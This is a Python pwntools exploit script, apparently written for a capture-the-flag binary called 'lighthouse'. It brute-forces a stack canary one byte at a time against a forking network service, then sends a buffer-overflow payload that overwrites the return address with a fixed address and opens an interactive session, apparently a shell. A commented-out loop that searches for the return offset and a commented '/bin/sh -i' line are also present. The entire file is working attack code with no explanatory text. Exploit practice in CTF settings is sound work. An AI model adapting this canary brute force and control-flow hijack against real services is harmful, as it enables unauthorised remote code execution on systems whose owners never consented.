#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = '0.0.0.0' , 9001
OFFSET_TO_CANARY = 136
elf = ELF('./lighthouse', checksec=False)

ret = 0x000000000040101a

#p = remote("offsec.m0lecon.it", 13560)
#p = process(elf.path)
#gdb.attach(p, gdbscript="""
#set follow-fork-mode child
#set detach-on-fork off
#b read_query
#c
#""")

known = b"\x00"
for i in range(7):

    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess
        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"> ")
        io.sendline(b"1")
        io.recvuntil(b"Enter your signal log entry: ")
        io.send(payload)
        try:
            data = io.recvall(timeout=1)
        except EOFError:
            data = b""
        io.close()

        
        #print(f"Trying byte {i}: {bval:02x} -> data = {data!r}")
        if b"stack smashing detected" not in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")


#for ripOff in range(376):
 #   io = remote(HOST, PORT, level='error')
  #  io.recvuntil(b"> ")
   # io.sendline(b"1")
    #io.recvuntil(b"Enter your signal log entry: ")
#    payload = flat(
 #      b"A" * OFFSET_TO_CANARY,
  #     p64(canary),
   #    p64(0x401630) * ripOff)
    #io.send(payload)
#    time.sleep(0.1)
 #   try:
  #      # if connection survives, guess is correct
   #     data = io.recv(timeout=0.5)
    #   log.success(f"RIP offset found: {ripOff}")
     #   io.interactive()
      #  break
#    except EOFError:
 #       # process crashed, wrong offset
  #      io.close()
   #     continue
  #  try:
   #     data = io.recvall(timeout=0.2)
    #except EOFError:
     #   data = b""
#    io.close()
#
 #   if b"Shell:" in data:
  #      log.success(f"ripOff:{ripOff}")
   #     OFFSET_TO_RIP=ripOff-1
    #    break

io = remote(HOST, PORT)
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"Enter your signal log entry: ")
payload = flat(
    b"A"*OFFSET_TO_CANARY, 
    p64(canary),
    b"B"*8,
    p64(0x0000000000401630)
        )
io.send(payload)
#io.sendline(b"/bin/sh -i")
io.interactive()
